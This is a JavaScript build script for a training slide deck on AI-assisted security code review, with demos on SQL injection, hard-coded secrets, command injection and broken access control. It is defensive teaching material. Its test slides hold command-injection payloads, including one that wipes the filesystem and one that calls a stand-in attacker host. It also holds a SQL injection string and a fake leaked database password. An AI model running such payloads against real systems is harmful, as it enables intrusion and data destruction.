// Module 5: AI-Assisted Code Review & Security Enhancement
const { Deck, C } = require("./lib");

module.exports = async function build(out) {
  const d = new Deck(5, "AI-Assisted Code Review & Security Enhancement");

  await d.titleSlide({
    title: "AI-Assisted Code Review & Security Enhancement",
    subtitle: "Use AI as a second reviewer: find weaknesses, verify them, fix them and prove the fix with security tests.",
    flow: [
      ["FaSearch", "Review", "AI as second reviewer", C.purple],
      ["FaClipboardCheck", "Verify", "Confirm or reject findings", C.navy],
      ["FaWrench", "Fix", "Smallest safe change", C.coral],
      ["FaShieldAlt", "Prove", "Security tests stay green", C.teal],
    ],
    notes: "All secrets in today's demos are fake, and every attack payload in the tests is mocked or runs against an in-memory database. Nothing harmful is ever executed.",
  });

  await d.goalsAgenda({
    sub: "3 live demos on deliberately vulnerable code",
    goals: [
      ["FaSearch", "Prompt AI for a structured security review"],
      ["FaClipboardCheck", "Verify findings and reject false positives"],
      ["FaUserShield", "Fix injection, secrets and access-control flaws"],
      ["FaVial", "Generate security tests that keep fixes in place"],
    ],
    agenda: [
      "Welcome & objectives",
      "Core concepts",
      "Setup: Module-5-Lab",
      "D1  Review & SQL Injection",
      "D2  Secrets & Command Injection",
      "D3  Security Tests for an API",
      "Lab, pitfalls & Q&A",
    ],
  });

  await d.flowBlocks({
    title: "The AI Code Review Workflow",
    sub: "Fast and broad, but every finding needs a human check",
    blocks: [
      { icon: "FaFileCode", color: C.navy, name: "Provide", what: "Code + context", k1: "YOU GIVE", v1: "Where input comes from", k2: "WATCH FOR", v2: "Confidential code" },
      { icon: "FaSearch", color: C.purple, name: "Review", what: "Targeted prompt", k1: "YOU ASK", v1: "Severity, why, fix", k2: "WATCH FOR", v2: "Vague \"looks fine\"" },
      { icon: "FaClipboardCheck", color: C.coral, name: "Verify", what: "Prove each one", k1: "YOU DO", v1: "Reproduce or reject", k2: "WATCH FOR", v2: "False positives" },
      { icon: "FaWrench", color: C.navy, name: "Fix", what: "Confirmed only", k1: "YOU KEEP", v1: "Behaviour + names", k2: "WATCH FOR", v2: "Fixes that break features" },
      { icon: "FaVial", color: C.teal, name: "Test", what: "Lock it in", k1: "YOU ADD", v1: "A test per finding", k2: "WATCH FOR", v2: "Regressions later" },
    ],
  });

  await d.tableSlide({
    title: "Common Security Weaknesses",
    sub: "What to ask the AI to look for, and where we see each one today",
    head: ["Weakness", "Looks like", "Fix", "Demo"],
    rows: [
      ["SQL injection", "`f\"... WHERE name = '{name}'\"`", "Parameterized queries `?`", "D1"],
      ["Info leakage in errors", "`return {\"error\": str(e), \"query\": q}`", "Log details; generic message", "D1, D3"],
      ["Hard-coded secrets", "`API_TOKEN = \"...\"` in source", "Env var / secret store; rotate", "D2"],
      ["Command injection", "`subprocess.run(f\"ping {host}\", shell=True)`", "Validate; arg list; no shell", "D2"],
      ["Broken access control", "Any user can read any invoice (IDOR)", "Check owner/role on every request", "D3"],
      ["XSS / vulnerable deps", "Unescaped HTML; old packages", "Encode output; `pip-audit`", "Lab"],
    ],
    colW: [2.0, 3.5, 2.6, 0.9],
    fontSize: 11,
    belowY: 3.85,
    below: ["**Authentication** = who you are (401). **Authorization** = what you may do (403/404). Both, on every request."],
  });

  await d.iconRows({
    title: "Prompting for a Security Review",
    sub: "Role, context, concerns, and a fixed output format",
    rows: [
      { icon: "FaUserTie", color: C.purple, head: "Set the role", text: "\"Act as a senior Python security reviewer\"" },
      { icon: "FaMapSigns", head: "Give the context", text: "What the app does; which inputs come from users" },
      { icon: "FaCrosshairs", color: C.coral, head: "Name the concerns", text: "Injection, validation, secrets, access control, leakage" },
      { icon: "FaTable", color: C.teal, head: "Fix the format", text: "ID, location, severity, why, fix, plus \"needs verification\"" },
      { icon: "FaHandPaper", head: "Review before rewrite", text: "\"Do not rewrite the file yet\": findings first" },
    ],
    panel: { caption: "Every finding has four parts", fontSize: 9.5, lines: [
      "F1  SQL built with an f-string",
      "    (search_orders)        HIGH",
      "",
      "Why: x' OR '1'='1 returns",
      "     every customer's orders",
      "",
      "Fix: WHERE customer = ?",
      "",
      "Verified by:",
      "  test_injection_returns_nothing",
    ] },
  });

  await d.grid4({
    title: "AI Review: Limits & Responsible Use",
    sub: "A second opinion, not a security guarantee",
    cells: [
      { icon: "FaEyeSlash", color: C.coral, head: "Misses things", text: "Context-dependent flaws (business logic, auth across services) are often missed. A clean AI review is not a pass." },
      { icon: "FaBell", color: C.navy, head: "False positives", text: "It flags safe code too (\"DB_PATH is a secret\"). Verify, then record **why** you rejected it." },
      { icon: "FaBalanceScale", color: C.purple, head: "Security vs function", text: "A fix that breaks the feature is a new bug. Keep the functional tests green next to the security tests." },
      { icon: "FaUserLock", color: C.teal, head: "Protect what you paste", text: "No real secrets, personal data or proprietary code in unapproved tools. Follow your organisation's AI policy." },
    ],
  });

  await d.stepsCode({
    title: "Setup: Module-5-Lab",
    sub: "Vulnerable on purpose; safe to run",
    steps: [
      "Open `Module-5-Lab`; create the venv; install requirements",
      "`pytest` → the hardened solutions pass every security test",
      "`--target starter` → the vulnerable starters fail them",
      "All secrets are **fake**; `subprocess.run` is mocked in tests",
      "Never test attacks on systems you don't own",
    ],
    panel: { caption: "PowerShell, in Module-5-Lab", fontSize: 9.5, lines: [
      "pytest",
      "  42 passed",
      "pytest --target starter",
      "  37 failed, 5 passed",
      "",
      "# D1 demo1_review   orders_db.py",
      "# D2 demo2_secrets  net_tools.py",
      "# D3 demo3_authz    invoices_api.py",
      "",
      "# the 5 passes = normal features",
      "# that worked all along",
    ] },
  });

  // ---------- D1 ----------
  await d.demoOverview({
    demo: "D1", name: "Review & SQL Injection", folder: "Module-5-Lab/demo1_review",
    flow: [
      ["FaFileCode", "orders_db.py", "Looks fine", C.navy],
      ["FaSearch", "AI review", "F1 … F7", C.purple],
      ["FaClipboardCheck", "Verify", "5 kept, 2 rejected", C.coral],
      ["FaWrench", "Fix F1–F5", "Parameterized", C.navy],
      ["FaCheckCircle", "pytest", "10 passed", C.teal],
    ],
    goal: "Review a support-dashboard module with a structured AI prompt. **Prove** the SQL injection in a Python shell, reject two false positives, fix only the confirmed findings, and record it all in `REVIEW.md`.",
    learn: ["A review prompt with severity + why + fix", "Reproducing a finding before fixing it", "Rejecting false positives, in writing", "One test per confirmed finding"],
  });
  await d.demoPrompt({
    demo: "D1", name: "Review & SQL Injection",
    panel: { caption: "Review prompt", fontSize: 9, lines: [
      "Act as a senior Python security reviewer.",
      "",
      "Context: orders_db.py is used by an internal",
      "support dashboard. The customer name and minimum",
      "amount come straight from a web form.",
      "",
      "Review it for: SQL injection, input validation,",
      "error handling and information leakage, and",
      "code quality.",
      "",
      "For each finding give: ID, location, severity",
      "(High / Medium / Low), why it matters (a concrete",
      "attack or failure), and a fix. Mark anything you",
      "are unsure about as \"needs verification\".",
      "Do not rewrite the file yet.",
    ] },
    points: [
      ["\"Comes from a web form\"", "Context tells the AI which inputs are attacker-controlled.", C.coral],
      ["A concrete attack", "\"Why it matters\" must be an example input, not \"could be insecure\".", C.purple],
      ["Rejected: F6, F7", "\"DB_PATH is a secret\" (it's a file name); \"use an ORM\" (out of scope).", C.navy],
      ["REVIEW.md", "The finished report: findings, rejected findings, what wasn't checked.", C.teal],
    ],
  });
  await d.demoRun({
    demo: "D1", name: "Review & SQL Injection",
    steps: [
      "Send the review prompt; read the findings",
      "Prove F1 in a Python shell (right)",
      "Reject false positives, with reasons",
      "\"Fix F1–F5 only; keep names and signatures\"",
      "Tests on the starter: **8 failed** → **10 passed**",
    ],
    panel: { caption: "Proving F1, then the fix", fontSize: 9, lines: [
      ">>> orders_db.search_orders(c,",
      "...     \"x' OR '1'='1\")",
      "[(1, 'Asha', 1200.0),",
      " (2, 'Rohan', 450.0)]   # everyone's!",
      "",
      "# before",
      "q = f\"... WHERE customer = '{customer}'\"",
      "# after",
      "conn.execute(",
      "  \"... WHERE customer = ?\", (customer,))",
      "",
      "# bonus: \"O'Brien\" now works too",
    ] },
    check: "Each confirmed finding has a test, so an injection can't quietly come back. The false positives are documented, so nobody re-raises them next sprint.",
  });

  // ---------- D2 ----------
  await d.demoOverview({
    demo: "D2", name: "Secrets & Command Injection", folder: "Module-5-Lab/demo2_secrets",
    flow: [
      ["FaKey", "Hard-coded token", "In source + git", C.coral],
      ["FaTerminal", "shell=True", "f\"ping {host}\"", C.coral],
      ["FaRobot", "Fix prompt", "Env var + validation", C.purple],
      ["FaTheaterMasks", "Mocked tests", "Nothing executes", C.navy],
      ["FaSyncAlt", "Rotate token", "Code can't fix git", C.teal],
    ],
    goal: "An uptime checker keeps its API token in the source and builds a shell command from user input. Have the AI explain the attack, fix both problems, and prove it with tests that never run a real command.",
    learn: ["Secrets in environment variables", "Allow-list validation (`ipaddress`, hostname)", "`subprocess.run([...], shell=False)`", "Why a leaked secret must be rotated"],
  });
  await d.demoPrompt({
    demo: "D2", name: "Secrets & Command Injection",
    panel: { caption: "Fix prompt", fontSize: 9, lines: [
      "Fix two security issues in net_tools.py:",
      "",
      "1. Read STATUS_API_TOKEN from an environment",
      "   variable. If it is missing, raise RuntimeError",
      "   naming the variable - never print the token.",
      "2. Make ping() safe:",
      "   - validate host: an IP address (ipaddress",
      "     module) or a valid DNS hostname; anything",
      "     else raises ValueError BEFORE running",
      "   - subprocess.run with an argument LIST and",
      "     shell=False",
      "   - -n on Windows, -c elsewhere",
      "Keep the function names. Standard library only.",
    ] },
    points: [
      ["Explain before fixing", "\"What would ping('127.0.0.1 & whoami') run?\" makes the risk concrete.", C.coral],
      ["Validate with an allow-list", "Describe what is **allowed**; blocking bad characters always misses one.", C.purple],
      ["No shell at all", "With an argument list, `&` and `;` are just text."],
      ["Never print secrets", "Error messages and logs name the variable, not its value.", C.navy],
    ],
  });
  await d.demoRun({
    demo: "D2", name: "Secrets & Command Injection",
    steps: [
      "Search the source for `TOKEN|SECRET`: found",
      "Run the tests on the starter: **12 failed**",
      "Send the fix prompt; review the diff",
      "Tests again: **12 passed**, nothing executed",
      "Rotate the old token; put the new one in `.env`",
    ],
    panel: { caption: "Two of the security tests", fontSize: 9, lines: [
      "@pytest.mark.parametrize('payload', [",
      "    '127.0.0.1 & whoami',",
      "    '127.0.0.1; rm -rf /',",
      "    '$(curl evil.example)'])",
      "def test_injection_attempts_are_rejected(",
      "        fake_run, payload):",
      "    with pytest.raises(ValueError):",
      "        net_tools.ping(payload)",
      "    fake_run.assert_not_called()",
      "",
      "def test_no_secret_literals_in_source(...):",
      "    # walks the AST: no *TOKEN* = \"...\"",
    ] },
    check: "The code is fixed, but the old token is still in git history. Rotating it is a step no AI fix can do for you.",
  });

  // ---------- D3 ----------
  await d.demoOverview({
    demo: "D3", name: "Security Tests for an API", folder: "Module-5-Lab/demo3_authz",
    flow: [
      ["FaFileInvoice", "GET /invoices/<id>", "Happy path works", C.navy],
      ["FaUserSecret", "Attacker's view", "Rohan reads Asha's", C.coral],
      ["FaRobot", "Security tests", "4 categories", C.purple],
      ["FaTimesCircle", "Run", "17 failed", C.coral],
      ["FaCheckCircle", "Fix + review", "20 passed", C.teal],
    ],
    goal: "An invoice endpoint passes its normal tests, but it never checks **who** is asking, and its errors leak a database password. Generate security tests by category, watch them fail, then fix the handler with the failing tests as the spec.",
    learn: ["Authentication vs authorization (IDOR)", "404 for \"not yours\" to stop ID guessing", "400, never 500, for bad input", "Asserting that errors leak nothing"],
  });
  await d.demoPrompt({
    demo: "D3", name: "Security Tests for an API",
    panel: { caption: "Security-test prompt", fontSize: 9, lines: [
      "Act as a security tester. Write pytest tests for",
      "handle_get_invoice. Users are {name, role} with",
      "role customer or admin. Customers may only see",
      "their own invoices; admins see all.",
      "Cover, in separate groups:",
      "1. Authentication: None, {}, empty name,",
      "   unknown role -> 401",
      "2. Authorization (IDOR): another customer's",
      "   invoice must look exactly like not found (404)",
      "3. Input: \"abc\", \"101 OR 1=1\", \"\", None, -1, 0,",
      "   True, \"1e3\" -> 400, never 500",
      "4. Leakage: no connection strings, passwords,",
      "   hosts, exception names or tracebacks",
      "Keep two happy-path tests.",
    ] },
    points: [
      ["Think in categories", "Who are you? What may you see? What can you send? What do errors reveal?", C.purple],
      ["404, not 403", "Same answer for \"missing\" and \"not yours\", so IDs can't be discovered.", C.coral],
      ["Keep the happy path", "Security fixes must not break normal use.", C.teal],
      ["Review the AI's fix too", "Watch for 403 for \"not yours\", or rejecting a valid ID with spaces around it.", C.navy],
    ],
  });
  await d.demoRun({
    demo: "D3", name: "Security Tests for an API",
    steps: [
      "Show the leak in a Python shell (right)",
      "Generate the tests; review them by category",
      "`--target starter`: **17 failed, 3 passed**",
      "Fix: 401 → 400 → 404 → generic 500",
      "**20 passed**; review the diff for over-fixing",
    ],
    panel: { caption: "Before the fix", fontSize: 9, lines: [
      ">>> rohan = {'name': 'rohan',",
      "...          'role': 'customer'}",
      ">>> handle_get_invoice(rohan, 101)",
      "(200, {'owner': 'asha',",
      "       'amount': 18408.0, ...})",
      "",
      ">>> handle_get_invoice(rohan, 999)",
      "(500, {'error': 'KeyError(999)',",
      "  'db': 'postgresql://billing_app:",
      "        S3cr3t-Pa55@db.internal...'})",
      "",
      "# after: (404, {'error':",
      "#                'invoice not found'})",
    ] },
    check: "The 3 passing tests were the normal features. Security tests ask what happens when someone misuses the endpoint, and normal tests never ask that.",
  });

  await d.troubleshoot({
    items: [
      ["AI says \"no issues found\"", "Give context (which input is untrusted) and name the concerns explicitly."],
      ["Too many low-value findings", "Ask for severity and a concrete attack; drop anything without one."],
      ["A fix breaks a feature", "Run functional and security tests together. Both must stay green."],
      ["Validation blocks valid input", "Test the allowed cases too (`::1`, `\" 101 \"`), not just attacks."],
      ["Secret removed but still exposed", "It's in git history: rotate it, and add a secret scanner to CI."],
      ["Fear of running attack payloads", "Mock `subprocess`, use `:memory:` databases, test only your own systems."],
    ],
  });
  await d.challenge({
    items: [
      { level: "LAB 1", head: "AI code review", text: "Review an old project of yours (or a Module 1–4 starter) with the D1 prompt. Write a REVIEW.md with confirmed and rejected findings.", hint: "Every confirmed finding needs a concrete attack or failing input." },
      { level: "LAB 2", head: "Fix & test", text: "Add `update_invoice_status(user, id, status)` to D3. Only admins may change status. Generate its security tests first, then implement it.", hint: "Tests first: same four categories as D3." },
      { level: "LAB 3", head: "Final review", text: "Re-review your fixed code with the AI and compare with the first report. Run `pip-audit` on a real project's dependencies.", hint: "`pip install pip-audit`, then `pip-audit`." },
    ],
  });
  await d.summary({
    built: [
      ["D1", "Review & SQL Injection", "Structured review → verified → parameterized"],
      ["D2", "Secrets & Command Injection", "Env var, allow-list, no shell; rotate"],
      ["D3", "Security Tests for an API", "Auth, IDOR, input, leakage: 20 tests"],
    ],
    takeaways: [
      "AI reviews fast; humans verify",
      "Reject false positives in writing",
      "Fix only what's confirmed; keep features",
      "Every fix gets a security test",
    ],
    nextLabel: "COURSE COMPLETE",
    next: "Generate, debug, test, document, secure. You stay in charge.",
  });

  await d.save(out);
};
